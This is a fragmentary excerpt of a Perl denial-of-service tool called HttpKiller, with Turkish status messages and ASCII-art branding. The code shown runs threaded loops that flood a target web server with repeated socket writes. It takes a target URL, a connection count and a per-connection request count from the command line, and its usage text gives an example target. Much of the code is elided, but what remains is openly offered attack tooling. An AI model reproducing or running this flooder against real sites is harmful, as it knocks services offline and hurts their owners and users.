...
# HttpKiller.pl # By EyuBoo (Denial of Service attack)
...
sub sender {
    ...
    while(true) {
        ...
        unless($sock) {
            print "\n[x] ===>>> HttpKiller Bot Siteye Baglandi ... <<<===\n\n";
            sleep(1);
            next;
        }
...
sub sender2 {
    ...
    while(true) {
        ...
        unless($sock) {
            print "\n[x]HttpKiller Siteye Baglanamiyor...\n\n";
            next;
        }
        print $sock $paquete;
    }
...
sub comenzar {
    $SIG{'KILL'} = sub { print "HttpKiller Death...\n"; threads->exit(); };
    $url = $ARGV[0];
    print "URL: ".$url."\n";
    $max = $ARGV[1];
    $porconexion = $ARGV[2];
  ...
  ********  ****************    ||
   *******  ****************    ||
        ** *****************    ||
           ...
           *****************    ||
           ******************   ||  ========================
          *******************   ||  Coded eyuboo & Centros 7      
          ********************  ||  HttpKiller Http Dos Tool
          ********************  ||  ========================
         ********************** ||
       **************************
...
print "[-]HttpKiller Saldiri Basliyor...\n";
    for($v=0;$v<$max;$v++) {
        if ($thr[$v]->is_running()) {
            sleep(3);
            $v--;
...
if($#ARGV > 2) {
	...
	die("______________________________________________________________\n                  httpkiller.pl by:EyuBoo\n______________________________________________________________\nKullanimi: httpkiller.pl [url] [Baglanti] [Gönderilen Baglanti [IP Host\n* [URL]|Site\n* [Baglanti]|Connection\n* [Baglanti İstekleri]|Paketler\n* [localhost]|ip 127.0.0.1\n______________________________________________________________\nEx: httpkiller.pl http://www.siteadi.com 400 100 127.0.0.1\n");
}